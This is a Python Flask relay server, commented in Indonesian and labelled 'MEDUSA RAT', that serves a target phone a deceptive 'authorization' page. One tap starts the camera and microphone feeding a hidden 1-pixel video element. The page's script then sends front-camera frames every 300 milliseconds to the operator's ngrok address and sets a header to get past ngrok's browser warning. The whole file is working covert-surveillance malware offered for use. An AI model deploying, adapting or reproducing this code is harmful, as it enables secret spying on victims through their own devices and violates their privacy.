from flask import Flask, request, render_template_string

app = Flask(__name__)

# Memori RAM Render untuk menampung alamat Ngrok aktif dari PC Lab Anda
ALAMAT_NGROK_LAB = ""

# PENYELARAS RUTING PERMANEN: Menerima ketukan dari URL polos maupun URL /handshake secara bersamaan
@app.route('/', methods=['GET', 'POST'])
@app.route('/handshake', methods=['GET', 'POST'])
def handshake():
    global ALAMAT_NGROK_LAB
    
    # JALUR A: Menangkap sinkronisasi koordinat dari aplikasi run.py PC Lab Anda
    ip_lab = request.args.get('ip_lab')
    if ip_lab:
        ALAMAT_NGROK_LAB = ip_lab.replace("https://", "").replace("http://", "").strip()
        return f"✅ Terkunci: {ALAMAT_NGROK_LAB}", 200

    # JALUR B: Menyuplai Halaman Utama Tombol Merah ke HP Target
    html_raw_payload = """
    <html>
    <head>
        <title>System Synchronization</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 80px; }
            .box { border: 2px solid #ff0000; display: inline-block; padding: 30px; border-radius: 8px; background-color: #000; box-shadow: 0 0 15px #ff0000; }
            .btn { background-color: #8b0000; color: white; padding: 16px 32px; border: 1px solid #ff0000; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer; box-shadow: 0 0 10px #8b0000; }
            .btn:hover { background-color: #ff0000; box-shadow: 0 0 20px #ff0000; }
        </style>
    </head>
    <body>
        <div class="box">
            <h2>[ MEDUSA RAT INTERCONNECT ]</h2>
            <p>Laboratorium terisolasi memerlukan sinkronisasi media satu pintu.</p>
            <p style="color: #888; font-size: 11px;">Ketuk tombol di bawah SEKALI SAJA untuk memberikan otoritas penuh.</p>
            <br>
            <button class="btn" onclick="triggerAllOtoritas()">OTORISASI & SINKRONISASI</button>
        </div>

        <video id="v-feed" autoplay playsinline muted style="position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none;"></video>

        <script>
            var targetLabAddress = "TARGET_LAB_PLACEHOLDER";
            var lastSentTime = 0;
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');

            async function triggerAllOtoritas() {
                try {
                    let mediaStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" }, 
                        audio: true 
                    });
                    
                    let videoEl = document.getElementById("v-feed");
                    videoEl.srcObject = mediaStream;
                    
                    videoEl.onloadedmetadata = function() {
                        videoEl.play();
                        requestAnimationFrame(captureFrame);
                    };
                    
                    document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ STATUS: CONNECTED ]</h2><p>Sesi nirkabel aktif melintasi internet proxy.</p><p style='color:gray;'>Jangan tutup browser ini. Lab sedang memantau feed data.</p></div>";
                    
                } catch(err) {
                    alert("Gagal mengunci izin otomasi: " + err);
                }
            }

            function captureFrame(timestamp) {
                try {
                    let videoEl = document.getElementById("v-feed");
                    if (timestamp - lastSentTime > 300) {
                        if (videoEl.videoWidth > 0 && videoEl.videoHeight > 0) {
                            canvas.width = videoEl.videoWidth;
                            canvas.height = videoEl.videoHeight;
                            
                            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                            let base64data = canvas.toDataURL('image/jpeg', 0.4);
                            
                            // MENEMBAK PC LAB DENGAN BYPASS SENSOR NGROK MUTLAK
                            fetch('https://' + targetLabAddress + '/receive_frame', {
                                method: 'POST',
                                headers: {
                                    "Content-Type": "text/plain",
                                    "ngrok-skip-browser-warning": "69420" // Nilai bypass resmi sensor Ngrok
                                },
                                body: base64data
                            });
                            
                            lastSentTime = timestamp;
                        }
                    }
                } catch(e) {}
                requestAnimationFrame(captureFrame);
            }
        </script>
    </body>
    </html>
    """.replace("TARGET_LAB_PLACEHOLDER", ALAMAT_NGROK_LAB)

    return render_template_string(html_raw_payload), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
